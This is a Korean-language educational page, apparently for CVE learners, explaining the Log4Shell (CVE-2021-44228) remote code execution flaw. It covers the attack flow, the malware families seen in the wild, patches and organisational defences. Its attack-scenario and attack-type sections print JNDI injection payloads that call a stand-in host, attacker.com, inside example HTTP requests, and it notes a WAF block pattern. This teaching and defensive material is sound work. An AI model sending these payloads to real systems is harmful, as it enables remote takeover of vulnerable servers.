# 취약점 개요

import {
  Table,
  TableHeader,
  TableBody,
  TableRow,
  TableHead,
  TableCell,
} from "@/components/ui/table"

## 📋 설명

**Apache Log4j**는 자바 기반 애플리케이션에서 가장 널리 사용되는 로깅 라이브러리입니다.

대부분의 웹서비스, 내부 시스템, VM 솔루션 등에서 기본적으로 포함되어 있으며, 2021년 12월 공개된 **CVE-2021-44228 (Log4Shell)**은 단일 오픈소스 취약점임에도 글로벌 보안사고로 확대된 대표적인 사례입니다.

이 취약점은 Log4j의 `${}` 템플릿 처리 기능 안에 포함된 **JNDI Lookup 기능을 악용한 원격 코드 실행(RCE)** 취약점으로, 공격자가 단순 문자열을 서버가 로그로 기록하게 만들기만 해도 공격이 가능합니다.

## ⚠️ 왜 위험한가?

**인증 불필요**: 로그에 기록되는 모든 입력값이 공격 벡터가 될 수 있음

**공격 난이도 극히 낮음**: 단순 문자열 삽입만으로 RCE 가능

**공격 페이로드 전달 경로가 매우 다양함**: User-Agent, Referer, Path, API 파라미터 등 모든 로그 입력 경로

**전 세계 수많은 서비스가 Log4j를 내장**: 영향도가 폭발적으로 확대

**연속된 신규 취약점 발생**: 패치 과정에서 새로운 취약점들이 계속 발견되어 단순 버전업으로 해결되지 않음

---

## 취약점 정보

<div className="dark-table">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead className="text-white">항목</TableHead>
        <TableHead className="text-white">내용</TableHead>
      </TableRow>
    </TableHeader>
    <TableBody>
      <TableRow>
        <TableCell className="text-white">CVSS 점수</TableCell>
        <TableCell className="text-white">10.0 (Critical)</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">취약점 유형</TableCell>
        <TableCell className="text-white">JNDI Lookup 기반 원격 코드 실행 (RCE)</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">영향 버전</TableCell>
        <TableCell className="text-white">Log4j 2.0-beta9 ~ 2.14.1</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">공격 난이도</TableCell>
        <TableCell className="text-white">매우 낮음 (인증 불필요, 단순 문자열 삽입)</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">공개일</TableCell>
        <TableCell className="text-white">2021년 12월 9일</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">영향 범위</TableCell>
        <TableCell className="text-white">전 세계 수많은 Java 기반 서비스 (웹서비스, 내부 시스템, VM 솔루션 등)</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>

## 🌪️ 핵심 원인: JNDI Lookup 기능의 자동 실행

Log4j는 로그 메시지 내의 `${}` 패턴을 템플릿으로 해석하여 동적으로 값을 치환하는 기능을 제공합니다.

문제는 이 기능이 **JNDI (Java Naming and Directory Interface) Lookup**을 지원한다는 점입니다.

### 취약점 동작 흐름

1. **공격자가 `${jndi:ldap://attacker.com/Exploit}` 형태의 문자열을 서버 로그에 남김**
   - User-Agent, Referer, Path, API 파라미터 등 모든 로그 입력 경로를 통해 가능

2. **Log4j가 `${}` 패턴을 자동 해석하여 JNDI Lookup 호출**

3. **공격자가 운영하는 LDAP/RMI 서버에 접속**

4. **피해 서버가 공격자가 준비한 악성 Java Class를 로드**

5. **서버 내부에서 악성 코드 실행 → 원격 코드 실행(RCE) 발생**

### 공격자가 준비하는 구성요소

공격을 성공시키기 위해 공격자는 다음 구성요소를 준비해야 합니다:

- **쿼리 송신 서버**: 취약한 서비스를 대상으로 악성 요청 전달
- **LDAP/RMI 응답 서버**: Log4j의 JNDI Lookup이 연결하는 지점, 악성 Class 위치 제공
- **Class 파일 저장 서버**: 피해 서버가 다운로드할 악성 Class 파일 보관
- **악성 페이로드 유포 서버**: 최종 악성코드(랜섬웨어, RAT, 마이너 등) 제공

---

# 공격 시나리오

**Step 1. 공격자가 취약한 서비스 탐색**

공격자가 Log4j를 사용하는 Java 기반 서비스를 탐색

**Step 2. 악성 JNDI Lookup 문자열 삽입**

공격자가 User-Agent, Referer, Path, API 파라미터 등 모든 로그 입력 경로를 통해 `${jndi:ldap://attacker.com/Exploit}` 형태의 문자열 삽입

**예시:**
```
GET /search?q=${jndi:ldap://attacker.com/Exploit} HTTP/1.1
User-Agent: ${jndi:ldap://attacker.com/Exploit}
```

**Step 3. Log4j가 JNDI Lookup 자동 실행**

서버가 로그를 기록할 때 Log4j가 `${}` 패턴을 해석하여 JNDI Lookup 호출

**Step 4. 공격자 서버에서 악성 Class 로드**

피해 서버가 공격자의 LDAP/RMI 서버에 접속하여 악성 Java Class 다운로드

**Step 5. 원격 코드 실행 (RCE)**

악성 Class가 실행되어 공격자가 원하는 코드가 서버에서 실행됨

**결과:** 서버 장악, 랜섬웨어 설치, 크립토마이너 설치, 내부망 침투 등 치명적 효과

---

# 공격 유형

## 1) 고정 Exploit 기반 RCE

정해진 악성 Class 파일을 전달하는 기본 공격 방식

```
${jndi:ldap://attacker.com/Exploit}
```

## 2) Base64 기반 명령 실행

난독화를 통해 탐지 회피

```
${jndi:ldap://attacker/payload_base64}
```

## 3) 무작위 패턴 기반 공격

JDK 버전, 난수 등을 조합해 식별이 어려운 Class명 생성

탐지 우회에 효과적

---

# 실제 유포된 악성코드 유형

## 🦠 봇넷 / 크립토마이너

- **Mirai, Kinsing** 등
- 장악 후 DDoS·채굴 활동 수행

## 🦠 랜섬웨어

- **Khonsari, Nightsky** 등
- 서버 취약 서비스 대상 감염 사례 다수

## 🦠 RAT(원격 제어 악성코드)

- 내부망 전파 및 정보 탈취 목적

## 🦠 Reverse Shell

- 공격자가 피해 서버에 원격 쉘 연결
- 내부망 정찰과 권한 상승에 활용

---

# 대응이 어려웠던 이유

## 1) 연속된 신규 취약점 발생

Log4j 패치 과정에서 새로운 취약점들이 계속 발견됨

단순 버전업으로 해결되지 않음

## 2) 어디에서 사용 중인지 파악 어려움

Log4j는 JAR 내부에 포함되어 배포되는 경우가 많아 전체 시스템에서 위치를 식별하기 어려움

## 3) 공격 흔적이 잘 남지 않음

로그 메시지를 통해 진행되는 공격으로 실패한 흔적조차 남지 않을 수 있음

## 4) APT 그룹의 적극적 활용

기존 공격 인프라에 Log4j exploit을 추가하여 전 세계적으로 공격 시도 증가

---

# 패치 정보

## 안전한 버전

- **Log4j 2.15.0 이상** (권장: 최신 버전)

## 패치 내용

- JNDI Lookup 기능 비활성화
- `log4j2.formatMsgNoLookups=true` 시스템 속성 설정
- 환경 변수 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` 설정

## 즉시 업그레이드

취약 버전: Log4j 2.0-beta9 ~ 2.14.1

패치 버전: Log4j 2.15.0 이상

## 임시 대응 방안

업그레이드가 어려운 경우:

- `log4j2.formatMsgNoLookups=true` 시스템 속성 설정
- WAF/IPS에서 `${jndi:` 패턴 차단
- 서버 Outbound(외부로 나가는 트래픽) 통제 강화

---

# 조직이 취해야 하는 대응 방향

## 1) 보안장비 탐지 규칙 최신화

- WAF·IPS·Firewall 탐지룰 즉시 업데이트
- 악성 IP 차단
- 서버 Outbound(외부로 나가는 트래픽) 통제 강화

## 2) 핵심 인프라 모니터링

- 중앙관리 시스템, 인증 시스템 등 중요 서버 집중 감시

## 3) 광범위한 로그 수집 및 보관

- 공격자 흔적이 적기 때문에 로그 보존이 매우 중요
- 웹로그·시스템로그·DNS로그 모두 수집 권장

## 4) 소프트웨어 구성요소 관리(SBOM) 필요성

- 어떤 소프트웨어가 어떤 오픈소스를 포함하는지 관리
- 취약 오픈소스 포함 여부를 빠르게 식별 가능해짐

---

# 학습 포인트 (CVE 학습자용 요약)

## 🔹 Log4j는 문자열 하나만으로 서버에서 코드를 실행할 수 있는 극도로 위험한 취약점

단순 문자열 삽입만으로 원격 코드 실행이 가능한 매우 드문 사례입니다.

## 🔹 어디에 포함되어 있는지 파악하기 어려워 전 세계적으로 대규모 확산 피해 발생

JAR 내부에 포함되어 배포되는 경우가 많아 전체 시스템에서 위치를 식별하기 어렵습니다.

## 🔹 기업은 패치뿐 아니라 SBOM, 로그 수집, 네트워크 통제로 장기적인 대응 전략 필요

단순 패치만으로는 해결되지 않으며, 소프트웨어 구성요소 관리와 로그 수집, 네트워크 통제가 필수입니다.

## 🔹 JNDI Lookup 기능의 위험성

템플릿 처리 기능에 포함된 JNDI Lookup은 외부 리소스를 로드할 수 있어 매우 위험합니다.

## 🔹 공격 페이로드 전달 경로의 다양성

User-Agent, Referer, Path, API 파라미터 등 모든 로그 입력 경로가 공격 벡터가 될 수 있습니다.

---

# 참고 자료

- [Apache Log4j Security Advisory](https://logging.apache.org/log4j/2.x/security.html)

- [CVE-2021-44228 NVD 상세정보](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

- [CISA Log4j Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)

- [OWASP Log4Shell](https://owasp.org/www-community/vulnerabilities/Log4Shell)
